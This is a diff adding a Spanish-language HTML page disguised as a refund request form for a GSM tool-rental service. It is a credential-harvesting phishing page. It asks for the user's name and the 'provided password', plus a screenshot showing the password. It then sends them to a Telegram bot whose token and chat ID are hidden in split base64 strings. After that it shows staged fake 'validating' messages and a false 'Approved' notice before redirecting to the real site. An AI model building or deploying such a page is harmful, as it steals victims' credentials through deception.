@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Solicitud de Reembolso</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * {
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            box-sizing: border-box;
+        }
+
+        .modal-enter {
+            opacity: 0;
+            transform: scale(0.95) translateY(10px);
+        }
+        .modal-enter-active {
+            opacity: 1;
+            transform: scale(1) translateY(0);
+            transition: opacity 300ms cubic-bezier(0.2, 0.8, 0.2, 1), 
+                        transform 300ms cubic-bezier(0.2, 0.8, 0.2, 1);
+        }
+        
+        @keyframes drift {
+            0% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -40px) scale(1.1); }
+            66% { transform: translate(-20px, 20px) scale(0.9); }
+            100% { transform: translate(0, 0) scale(1); }
+        }
+        .animate-drift {
+            animation: drift 12s ease-in-out infinite;
+            will-change: transform;
+        }
+        .animation-delay-2000 { animation-delay: 2s; }
+        .animation-delay-4000 { animation-delay: 4s; }
+
+        .glass-panel {
+            background: rgba(20, 20, 20, 0.25); 
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: none; 
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); 
+        }
+        
+        .glass-input {
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.05); 
+            color: white;
+            transition: all 0.3s ease;
+        }
+        
+        .glass-input:focus {
+            background: rgba(10, 10, 10, 0.4);
+            border-color: rgba(239, 68, 68, 0.6);
+            box-shadow: 0 0 15px rgba(239, 68, 68, 0.15);
+            outline: none;
+        }
+
+        .glass-button {
+            background: rgba(220, 38, 38, 0.15);
+            border: none; 
+            box-shadow: inset 0 0 0 1px rgba(239, 68, 68, 0.2); 
+            backdrop-filter: blur(4px);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .glass-button:hover:not(:disabled) {
+            background: rgba(220, 38, 38, 0.3);
+            box-shadow: inset 0 0 0 1px rgba(239, 68, 68, 0.5), 0 8px 20px rgba(220, 38, 38, 0.25);
+            transform: translateY(-2px);
+        }
+
+        .glass-button:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #050505; }
+        ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.15); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(239, 68, 68, 0.5); }
+
+        .loading-shimmer::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 50%;
+            height: 100%;
+            background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.08), transparent);
+            transform: skewX(-20deg);
+            animation: shimmerSlide 2s infinite;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        @keyframes shimmerSlide {
+            100% { left: 200%; }
+        }
+
+        .modern-loader {
+            position: relative;
+            width: 20px;
+            height: 20px;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+            animation: spinContainer 3s linear infinite;
+        }
+
+        .loader-orb {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #ef4444; 
+            box-shadow: 0 0 8px #ef4444;
+            animation: pulseOrb 1.5s ease-in-out infinite alternate;
+        }
+
+        .loader-orb:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); animation-delay: 0s; }
+        .loader-orb:nth-child(2) { bottom: 0; left: 0; animation-delay: -0.5s; }
+        .loader-orb:nth-child(3) { bottom: 0; right: 0; animation-delay: -1s; }
+
+        @keyframes spinContainer {
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulseOrb {
+            0% { transform: scale(0.6) translateX(0); opacity: 0.5; }
+            100% { transform: scale(1.2) translateX(0); opacity: 1; background: #fca5a5; box-shadow: 0 0 12px #fca5a5; }
+        }
+
+        .text-glow-fix {
+            text-shadow: 0 2px 4px rgba(0,0,0,0.9);
+        }
+    </style>
+</head>
+<body class="bg-[#050505] text-gray-200 relative overflow-x-hidden min-h-screen flex flex-col">
+
+    <div class="fixed inset-0 z-0 pointer-events-none overflow-hidden">
+        <div class="absolute top-[-10%] left-[-10%] w-[400px] h-[400px] bg-red-700 rounded-full mix-blend-screen filter blur-[130px] opacity-40 animate-drift"></div>
+        <div class="absolute bottom-[10%] right-[-10%] w-[400px] h-[400px] bg-gray-600 rounded-full mix-blend-screen filter blur-[120px] opacity-20 animate-drift animation-delay-2000"></div>
+        <div class="absolute top-[30%] left-[40%] w-[300px] h-[300px] bg-red-900 rounded-full mix-blend-screen filter blur-[100px] opacity-30 animate-drift animation-delay-4000"></div>
+    </div>
+
+    <div class="relative z-10 flex-grow flex items-center justify-center p-4 py-10 w-full h-full flex-col">
+        <div class="max-w-md w-full glass-panel rounded-3xl overflow-hidden relative transition-all duration-300">
+            
+            <div class="p-6 text-center bg-white/[0.02]">
+                <div class="flex justify-center mb-3">
+                    <div class="p-3 bg-red-500/10 rounded-full backdrop-blur-md shadow-[0_0_20px_rgba(239,68,68,0.2)] flex items-center justify-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                        </svg>
+                    </div>
+                </div>
+                <h1 class="text-2xl font-bold tracking-wide text-white drop-shadow-md">Reembolso Alquiler Herramientas</h1>
+                <p class="text-gray-400 text-sm mt-1">wYMagicServer Best GSM Services.</p>
+            </div>
+
+            <form id="reportForm" class="p-6 space-y-4">
+                
+                <div>
+                    <label for="username" class="block text-sm font-medium text-gray-300 mb-1.5 tracking-wide">Usuario o Correo Proporcionado</label>
+                    <div class="relative group">
+                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none transition-colors duration-300 group-focus-within:text-red-400 text-gray-500">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+                            </svg>
+                        </div>
+                        <input type="text" id="username" name="username" required
+                            class="w-full pl-10 pr-3 py-3 glass-input rounded-xl placeholder-gray-600"
+                            placeholder="Ej: juanperez123">
+                    </div>
+                </div>
+
+                <div>
+                    <label for="email" class="block text-sm font-medium text-gray-300 mb-1.5 tracking-wide">Contraseña Proporcionada</label>
+                    <div class="relative group">
+                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none transition-colors duration-300 group-focus-within:text-red-400 text-gray-500">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                            </svg>
+                        </div>
+                        <input type="email" id="email" name="email" required
+                            class="w-full pl-10 pr-3 py-3 glass-input rounded-xl placeholder-gray-600"
+                            placeholder="Ej: correo@ejemplo.com">
+                    </div>
+                </div>
+
+                <div>
+                    <label for="description" class="block text-sm font-medium text-gray-300 mb-1.5 tracking-wide">Descripción del Problema</label>
+                    <div class="relative group">
+                        <div class="absolute top-3.5 left-3 flex items-start pointer-events-none transition-colors duration-300 group-focus-within:text-red-400 text-gray-500">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h7" />
+                            </svg>
+                        </div>
+                        <textarea id="description" name="description" required rows="3"
+                            class="w-full pl-10 pr-3 py-3 glass-input rounded-xl placeholder-gray-600 resize-none"
+                            placeholder="Describe por qué solicitas el reembolso..."></textarea>
+                    </div>
+                </div>
+
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-1.5 tracking-wide">Comprobante del error, La contraseña debe ser visible.</label>
+                    <div class="mt-1 flex justify-center px-6 pt-5 pb-6 border border-dashed border-gray-600/30 rounded-xl hover:border-red-500/50 transition-all duration-300 cursor-pointer bg-black/20 group" id="dropZone" onclick="document.getElementById('errorImage').click()">
+                        
+                        <div class="space-y-1 text-center transition-all duration-300 group-hover:scale-105" id="uploadPlaceholder">
+                            <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-white/5 mb-3 group-hover:bg-red-500/10 transition-colors">
+                                <svg class="h-6 w-6 text-gray-400 group-hover:text-red-400 transition-colors" stroke="currentColor" fill="none" viewBox="0 0 48 48">
+                                    <path d="M28 8H12a4 4 0 00-4 4v20m32-12v8m0 0v8a4 4 0 01-4 4H12a4 4 0 01-4-4v-4m32-4l-3.172-3.172a4 4 0 00-5.656 0L28 28M8 32l9.172-9.172a4 4 0 015.656 0L28 28m0 0l4 4m4-24h8m-4-4v8m-12 4h.02" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                                </svg>
+                            </div>
+                            <div class="flex text-sm justify-center">
+                                <span class="relative cursor-pointer font-medium text-red-400 hover:text-red-300 transition-colors">Sube un archivo</span>
+                                <p class="pl-1 text-gray-400">o captura</p>
+                            </div>
+                            <p class="text-xs text-gray-500">PNG o JPG hasta 10MB</p>
+                        </div>
+
+                        <div id="imagePreviewContainer" class="hidden flex-col items-center w-full animate-[fadeIn_0.3s_ease-out]">
+                            <img id="imagePreview" src="" alt="Previsualización" class="max-h-40 rounded-lg shadow-lg object-contain mb-3 bg-black/40">
+                            <button type="button" id="changeImageBtn" class="text-xs px-4 py-2 bg-black/40 hover:bg-black/60 rounded-full text-gray-300 font-medium transition-all backdrop-blur-sm">
+                                Cambiar imagen
+                            </button>
+                        </div>
+                    </div>
+                    <input id="errorImage" name="errorImage" type="file" accept="image/*" class="sr-only" required>
+                </div>
+
+                <button type="submit" id="submitBtn" class="relative w-full flex items-center justify-center py-4 px-4 rounded-xl shadow-lg text-sm font-bold text-white glass-button mt-6 tracking-widest uppercase min-h-[56px] overflow-hidden">
+                    <span id="btnText" class="text-center w-full block">SOLICITAR REEMBOLSO</span>
+                </button>
+            </form>
+        </div>
+        
+        <div class="mt-6 text-gray-500 text-xs font-medium tracking-widest opacity-60 hover:opacity-100 transition-opacity">
+            DEV: YETTAZS
+        </div>
+    </div>
+
+    <div id="successModal" class="fixed inset-0 z-50 flex items-center justify-center hidden bg-black/70 backdrop-blur-md p-4 transition-opacity duration-300">
+        <div class="glass-panel rounded-3xl max-w-sm w-full p-8 text-center transform modal-enter shadow-[0_20px_50px_rgba(34,197,94,0.15)]" id="modalContent">
+            
+            <div class="mx-auto flex items-center justify-center h-16 w-16 rounded-full bg-green-500/10 mb-6 shadow-[0_0_25px_rgba(34,197,94,0.2)]">
+                <svg class="h-8 w-8 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                </svg>
+            </div>
+            
+            <h3 class="text-2xl font-bold text-white mb-2 tracking-wide drop-shadow-md">¡Aprobado!</h3>
+            <p class="text-gray-300 mb-8 text-base leading-relaxed font-medium">Datos validados, tu reembolso fue aprobado.</p>
+            
+            <button onclick="finishAndRedirect()" class="w-full inline-flex justify-center bg-green-600/20 hover:bg-green-600/30 transition-all duration-300 rounded-xl px-4 py-3.5 font-bold text-white shadow-lg tracking-wider uppercase text-sm backdrop-blur-md">
+                Finalizar
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const _tP = ['ODM3MjgwMDYxOA==', 'OkFBSHdIOVEtV2lu', 'QWF3cnRZSzFoYndY', 'RzZNUDBIVGlvaUFn'];
+        const _cP = ['LTEwMDMzODY=', 'NjQ5OTg1'];
+        
+        const TELEGRAM_BOT_TOKEN = atob(_tP[0]) + atob(_tP[1]) + atob(_tP[2]) + atob(_tP[3]);
+        const TELEGRAM_CHAT_ID = atob(_cP[0]) + atob(_cP[1]);
+
+        const form = document.getElementById('reportForm');
+        const fileInput = document.getElementById('errorImage');
+        const uploadPlaceholder = document.getElementById('uploadPlaceholder');
+        const imagePreviewContainer = document.getElementById('imagePreviewContainer');
+        const imagePreview = document.getElementById('imagePreview');
+        const changeImageBtn = document.getElementById('changeImageBtn');
+        const submitBtn = document.getElementById('submitBtn');
+
+        fileInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file && file.type.startsWith('image/')) {
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    imagePreview.src = event.target.result;
+                    uploadPlaceholder.classList.add('hidden');
+                    imagePreviewContainer.classList.remove('hidden');
+                    imagePreviewContainer.classList.add('flex');
+                    document.getElementById('dropZone').classList.remove('border-dashed', 'bg-black/20');
+                    document.getElementById('dropZone').classList.add('bg-black/40');
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+
+        changeImageBtn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            fileInput.click();
+        });
+
+        const chars = '!<>-_\\/[]{}—=+*^?#________';
+        
+        class TextScramble {
+            constructor(el) {
+                this.el = el;
+                this.frameRequest = null;
+                this.update = this.update.bind(this);
+            }
+            
+            setText(newText) {
+                const oldText = this.el.innerText;
+                const length = Math.max(oldText.length, newText.length);
+                const promise = new Promise((resolve) => this.resolve = resolve);
+                this.queue = [];
+                
+                for (let i = 0; i < length; i++) {
+                    const from = oldText[i] || '';
+                    const to = newText[i] || '';
+                    const start = Math.floor(Math.random() * 40);
+                    const end = start + Math.floor(Math.random() * 40);
+                    this.queue.push({ from, to, start, end });
+                }
+                
+                cancelAnimationFrame(this.frameRequest);
+                this.frame = 0;
+                this.update();
+                return promise;
+            }
+            
+            update() {
+                let output = '';
+                let complete = 0;
+                for (let i = 0, n = this.queue.length; i < n; i++) {
+                    let { from, to, start, end, char } = this.queue[i];
+                    if (this.frame >= end) {
+                        complete++;
+                        output += to;
+                    } else if (this.frame >= start) {
+                        if (!char || Math.random() < 0.28) {
+                            char = this.randomChar();
+                            this.queue[i].char = char;
+                        }
+                        output += `<span class="opacity-40">${char}</span>`;
+                    } else {
+                        output += from;
+                    }
+                }
+                
+                this.el.innerHTML = output;
+                
+                if (complete === this.queue.length) {
+                    this.resolve();
+                } else {
+                    this.frameRequest = requestAnimationFrame(this.update);
+                    this.frame++;
+                }
+            }
+            
+            randomChar() {
+                return chars[Math.floor(Math.random() * chars.length)];
+            }
+        }
+
+        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        
+        function getRandomTime(minSecs, maxSecs) {
+            const min = minSecs * 1000;
+            const max = maxSecs * 1000;
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            submitBtn.disabled = true;
+            submitBtn.classList.add('cursor-not-allowed', 'loading-shimmer');
+
+            submitBtn.innerHTML = `
+                <div class="flex flex-col items-center justify-center w-full relative z-10 px-1 py-1 h-full gap-2">
+                    <div class="flex items-center justify-center w-full gap-3">
+                        <div class="modern-loader">
+                            <div class="loader-orb"></div>
+                            <div class="loader-orb"></div>
+                            <div class="loader-orb"></div>
+                        </div>
+                        <span id="btnDynamicText" class="text-sm font-bold tracking-wide whitespace-normal leading-tight text-left flex-1 font-mono text-glow-fix"></span>
+                    </div>
+                    <div class="w-full h-1 bg-black/60 rounded-full overflow-hidden shadow-inner border border-white/5 relative">
+                        <div id="btnProgressBar" class="h-full bg-gradient-to-r from-red-600 to-red-400 shadow-[0_0_8px_#ef4444] w-0"></div>
+                    </div>
+                </div>
+            `;
+
+            const dynamicTextEl = document.getElementById('btnDynamicText');
+            const progressBarEl = document.getElementById('btnProgressBar');
+            const fx = new TextScramble(dynamicTextEl);
+
+            const username = document.getElementById('username').value;
+            const email = document.getElementById('email').value;
+            const description = document.getElementById('description').value;
+            const photoFile = fileInput.files[0];
+
+            const caption = `💰 <b>Solicitud de Reembolso</b>\n\n👤 <b>Usuario:</b> ${username}\n📧 <b>Email:</b> ${email}\n📝 <b>Razón:</b> ${description}`;
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', photoFile);
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(error => console.error('Error de red.'));
+
+            await fx.setText('Seleccionando Herramienta Alquilada');
+            progressBarEl.style.transition = 'width 4s linear';
+            progressBarEl.style.width = '25%';
+            await sleep(4000);
+
+            await fx.setText('Ingresando Datos');
+            progressBarEl.style.transition = 'width 9s linear';
+            progressBarEl.style.width = '60%';
+            await sleep(9000);
+
+            dynamicTextEl.classList.remove('text-sm');
+            dynamicTextEl.classList.add('text-[10px]', 'sm:text-xs'); 
+            await fx.setText('VALIDANDO DATOS EN TIEMPO REAL EN LA HERRAMIENTA');
+            
+            const randomPhase3Time = getRandomTime(4, 18);
+            progressBarEl.style.transition = `width ${randomPhase3Time / 1000}s linear`;
+            progressBarEl.style.width = '100%';
+            await sleep(randomPhase3Time);
+
+            submitBtn.disabled = false;
+            submitBtn.classList.remove('cursor-not-allowed', 'loading-shimmer');
+            submitBtn.innerHTML = '<span id="btnText" class="text-center w-full block font-sans relative z-10">SOLICITAR REEMBOLSO</span>';
+
+            form.reset();
+            resetImagePreview();
+            showModal();
+        });
+
+        function resetImagePreview() {
+            imagePreview.src = '';
+            uploadPlaceholder.classList.remove('hidden');
+            imagePreviewContainer.classList.add('hidden');
+            imagePreviewContainer.classList.remove('flex');
+            document.getElementById('dropZone').classList.add('border-dashed', 'bg-black/20');
+            document.getElementById('dropZone').classList.remove('bg-black/40');
+        }
+
+        function showModal() {
+            const successModal = document.getElementById('successModal');
+            const modalContent = document.getElementById('modalContent');
+            successModal.classList.remove('hidden');
+            
+            void modalContent.offsetWidth; 
+            
+            requestAnimationFrame(() => {
+                modalContent.classList.add('modal-enter-active');
+            });
+        }
+
+        function finishAndRedirect() {
+            const modalContent = document.getElementById('modalContent');
+            modalContent.classList.remove('modal-enter-active');
+            
+            setTimeout(() => {
+                window.location.href = "https://wymagicserver.es/";
+            }, 300);
+        }
+    </script>
+</body>
+</html>
